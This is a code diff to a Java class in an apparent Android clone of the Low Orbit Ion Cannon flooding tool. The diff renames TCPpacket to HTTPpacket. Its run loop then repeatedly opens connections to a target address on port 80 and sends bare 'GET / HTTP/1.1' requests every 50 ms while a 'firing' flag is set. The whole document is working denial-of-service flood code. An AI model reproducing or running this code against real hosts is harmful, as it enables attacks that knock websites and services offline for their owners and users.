@@ -1,4 +1,4 @@
-package com.example.rifatrashid.loworbitioncannon;
+package com.genius.rifatrashid.loworbitioncannon;
 
 import java.io.IOException;
 import java.io.OutputStreamWriter;
@@ -10,7 +10,7 @@ import java.net.Socket;
 /**
  * Created by Rifat Rashid on 8/12/2015.
  */
-public class TCPpacket implements Runnable {
+public class HTTPpacket implements Runnable {
 
     private InetAddress IPAddress;
     private byte[] sendData;
@@ -21,7 +21,7 @@ public class TCPpacket implements Runnable {
     public static int count = 0;
     public static long sTime = 0;
 
-    public TCPpacket(InetAddress IPAddress, byte[] sendData, int port) throws IOException {
+    public HTTPpacket(InetAddress IPAddress, byte[] sendData, int port)throws IOException{
         this.IPAddress = IPAddress;
         this.sendData = sendData;
         this.port = port;
@@ -31,16 +31,16 @@ public class TCPpacket implements Runnable {
         count = 0;
         sTime = System.currentTimeMillis();
         Socket sock;
-        while(managerClass.firing){
+        while (managerClass.firing){
             try{
                 sock = new Socket();
-                sock.connect(new InetSocketAddress(IPAddress, port), 10);
+                sock.connect(new InetSocketAddress(IPAddress, 80), 10);
                 OutputStreamWriter outputStreamWriter = new OutputStreamWriter(sock.getOutputStream());
-                outputStreamWriter.write(sendData.toString());
+                outputStreamWriter.write("GET / HTTP/1.1");
                 outputStreamWriter.close();
                 sock.close();
                 count++;
-                Thread.sleep(10);
+                Thread.sleep(50);
             }catch (Exception io){
                 io.printStackTrace();
             }
